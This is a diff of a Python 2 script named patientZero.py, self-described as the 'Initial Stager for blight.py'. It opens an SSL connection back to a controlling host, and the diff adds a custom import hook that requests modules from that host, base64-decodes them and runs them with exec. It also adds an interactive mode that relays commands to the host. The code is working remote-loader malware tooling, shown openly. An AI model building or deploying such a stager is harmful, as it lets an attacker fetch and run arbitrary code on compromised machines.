@@ -1,13 +1,10 @@
-import multiprocessing
 import argparse
 import select
 import base64
 import socket
-import Queue
 import imp
 import sys
 import ssl
-import os
 
 def log(inp, quiet=0):
     try:
@@ -17,8 +14,8 @@ def log(inp, quiet=0):
     if not quiet:
         print inp 
     
-class patientZero():
-        def __init__(self,phost,port=54189,strict=False,keyfile="key.pem",certfile="cert.pem",stager=True):
+class patientZero(object):
+        def __init__(self,phost,port=54189,strict=False,keyfile="key.pem",certfile="cert.pem",interactive=False):
             self.phost = phost
             self.port = port 
             self.strict = strict
@@ -30,7 +27,7 @@ class patientZero():
             #connection back to source
             self.blight = self.contraction()
 
-            if not stager:
+            if interactive:
                 self.standalone_mode()       
 
 
@@ -57,6 +54,11 @@ class patientZero():
                     if out in [ "exit\n","quit\n","bye\n"]:
                         break
 
+                    if "import" in out: 
+                        filtered = out.split()[1].rstrip('\n')
+                        pack = self.find_package(filtered)
+                        self.load_package(pack)
+        
                     if len(out) > 1:
                         self.blight.send("%s" % out)
                     else:
@@ -118,24 +120,51 @@ class patientZero():
             return buf
 
 
-        def get_package(self,package_name):
-            self.blight.send("import %s\n" % package_name)
-            package = self.get_bytes(self.blight) 
-            print "[<.<] Package recieved: len:%d" % len(package)
-            print "[>.>] Package start:\n%s" % (package[0:100],)
-            mod = imp.new_module(package_name)
+        def find_module(self,package_name,path=None):
             
-            exec package in mod.__dict__ 
-            sys.modules[package_name] = mod
-            import package_name
-            print "[^.^] Sucessfully contracted %s!" % (package_name,)
+            if package_name in sys.modules:
+                raise ImportError("Already imported!")
+        
+            try:
+                package_name = package_name.split('.')[1]   
+            except:
+                pass
+
+            self.blight.send("import %s" % package_name)
+
+            self.new_mod = self.get_bytes(self.blight) 
+            print self.new_mod 
+            self.new_mod = base64.b64decode(self.new_mod)
+            print self.new_mod 
+
+            if self.new_mod:
+                print "[<.<] Package recieved: len:%d" % len(self.new_mod)
+                print self.new_mod
+                return self
+
+            return None
+            
+
+        def load_module(self,module):
+
+            mod = imp.new_module(module)
+            if not self.new_mod:
+                raise ImportError("No module to be loaded!")
+            try:
+                exec self.new_mod in mod.__dict__ 
+            except Exception as e:
+                print str(e)
+                 
+            sys.modules[module] = mod
+
+            exec("import %s" % module)
+            print "[^.^] Sucessfully contracted %s!" % (module,)
+            
+            return mod
 
 
-
-#class ContaminantImporter(self):
 
 if __name__ == "__main__":
-
 
     progDesc = ("<(x.x)> ~patientZero.py~ <(x.x)>\r\n"
                 "Initial Stager for blight.py\n")         
@@ -147,17 +176,17 @@ if __name__ == "__main__":
     argParser.add_argument("-s","--strict",help="Care about ssl cert",action="store_true",default=False)
     argParser.add_argument("-k","--keyfile",help="Specify key (.pem)",default="key.pem")
     argParser.add_argument("-c","--certfile",help="Specify cert (.pem)",default="cert.pem")
+    argParser.add_argument("-i","--interactive", help="Interactive mode(testing)",action="store_true")
+    
 
     if len(sys.argv) < 2:
         sys.argv.append("-h") 
     
     argv = argParser.parse_args()
-    p = patientZero(argv.phost,argv.port,argv.strict,argv.keyfile,argv.certfile,stager=False) 
-    
+    sys.meta_path = [patientZero(argv.phost,argv.port,argv.strict,argv.keyfile,argv.certfile,argv.interactive)] 
 
 
 
-
-
-
+    import os
+    print os.getcwd()
 
